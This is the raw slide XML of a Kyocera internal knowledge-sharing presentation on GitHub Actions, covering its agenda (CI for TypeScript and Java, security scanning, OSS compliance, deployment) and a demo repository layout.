          <a:bodyPr vert="horz" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US"/>
              <a:t>マスター タイトルの書式設定</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="528001" y="1588958"/>
            <a:ext cx="11160839" cy="4062543"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0">
            <a:no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Slide Number Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95723448-76E8-5A7D-4CE3-76075F2E9F20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11358465" y="6505328"/>
            <a:ext cx="666276" cy="374975"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t" anchorCtr="0"/>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr marL="0" algn="r"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3381702-59A5-4643-AE93-D7BF7F78153B}" type="slidenum">
              <a:rPr lang="en-GB" sz="1800" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Meiryo UI"/>
                <a:ea typeface="Meiryo UI"/>
              </a:rPr>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB" sz="1800">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Meiryo UI"/>
              <a:ea typeface="Meiryo UI"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A33C1039-6B15-6CA8-3AE4-652276463C67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7635268" y="6575094"/>
            <a:ext cx="3837497" cy="216000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr" anchorCtr="0"/>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr marL="0" algn="r" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:defRPr sz="7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altLang="ja-JP" sz="700">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Meiryo UI"/>
                <a:ea typeface="Meiryo UI"/>
              </a:rPr>
              <a:t>©20</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="700">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Meiryo UI"/>
                <a:ea typeface="Meiryo UI"/>
              </a:rPr>
              <a:t>26</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" altLang="ja-JP" sz="700">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Meiryo UI"/>
                <a:ea typeface="Meiryo UI"/>
              </a:rPr>
              <a:t> KYOCERA Document Solutions Inc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="700">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Meiryo UI"/>
              <a:ea typeface="Meiryo UI"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2952492359"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="2147483690" r:id="rId1"/>
    <p:sldLayoutId id="2147483689" r:id="rId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dt="0"/>
  <p:txStyles>
    <p:title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7.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image22.png"/><Relationship Id="rId12"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5.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image16.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.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38.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1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5.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38.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3EFC5-7F23-BC4A-AB9D-219B433F4B07}"/>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83385E68-37BE-DAF8-BB4A-5AAE156A408F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716475" y="1427835"/>
            <a:ext cx="6688754" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="3600" b="1" dirty="0">
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Knowledge Sharing: GitHub Actions</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="4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0" name="テキスト ボックス 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8DAC44A2-BC24-8290-4176-16C29F41EFC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716475" y="3157121"/>
            <a:ext cx="4706481" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-PH" altLang="ja-JP" sz="20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Kyocera Document Solutions Inc.</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="ja-JP" altLang="en-US" sz="20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テキスト ボックス 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D07BD16D-3012-68F7-A808-91B86E921E10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716475" y="3557231"/>
            <a:ext cx="3432350" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" b="1" dirty="0">
                <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
                <a:ea typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
                <a:cs typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>KDDP SD45 – Global Solutions</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"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テキスト ボックス 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F86A25E-3851-3E05-E318-2E34E43D08B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716475" y="2842917"/>
            <a:ext cx="2503506" cy="307777"/>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ja-JP" sz="1400" b="1" dirty="0">
                <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
                <a:ea typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
                <a:cs typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>October 22, 2026</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US"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テキスト ボックス 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{726B3B76-3BA6-6E0E-EE20-7EDD0797C4B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716475" y="3875209"/>
            <a:ext cx="2560957" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="14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Gabriel Jefferson Boltron</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" b="1"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346132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Agenda</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From the first workflow file to a secured, compliant deployment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1600200"/>
            <a:ext cx="603504" cy="603504"/>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5" name="Icon 5" descr="Workflow"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="693481" y="1745041"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="1581912"/>
            <a:ext cx="58521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900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E3CBE"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GitHub Actions in 5 minutes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="1929384"/>
            <a:ext cx="5852160" cy="310896"/>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400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Events, workflows, jobs, steps and runners</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2441448"/>
            <a:ext cx="603504" cy="603504"/>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9" name="Icon 9" descr="ListChecks"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="693481" y="2586289"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="2423160"/>
            <a:ext cx="58521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900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A9BCD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CI for TypeScript and Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="2770632"/>
            <a:ext cx="5852160" cy="310896"/>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400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Format, lint, typecheck</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, unit and e2e tests, dependency audit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3282696"/>
            <a:ext cx="603504" cy="603504"/>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3" name="Icon 13" descr="ShieldCheck"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="693481" y="3427537"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="3264408"/>
            <a:ext cx="58521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900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="26AF72"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="3611880"/>
            <a:ext cx="5852160" cy="310896"/>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400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CodeQL, zizmor, Dependabot</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4123944"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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7" name="Icon 17" descr="FileSpreadsheet"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="693481" y="4268785"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="4105656"/>
            <a:ext cx="58521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900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OSS compliance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="4453128"/>
            <a:ext cx="5852160" cy="310896"/>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400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>License and vulnerability policy as a downloadable CSV</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4965192"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F06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1" name="Icon 21" descr="Rocket"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="693481" y="5110033"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="4946904"/>
            <a:ext cx="58521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900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F06400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deploy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="5294376"/>
            <a:ext cx="5852160" cy="310896"/>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400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Automatic GitHub Release on version bump, or manual</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Demo repo card"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7635240" y="1600200"/>
            <a:ext cx="4023360" cy="4160520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="1828800"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="282828"/>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6" name="Icon 26" descr="GitBranch"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7999903" y="1964863"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8595360" y="1828800"/>
            <a:ext cx="2926080" cy="56692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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Demo repository</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="2606040"/>
            <a:ext cx="3611880" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>github-actions-demo/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="accent3"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ts-app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  TypeScript, pnpm, Vitest, Playwright</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="accent4"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>java-app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Java 21, Maven, JUnit, Playwright</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.github</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  6 workflows, 2 composite actions, OSS policy, Dependabot</a:t>
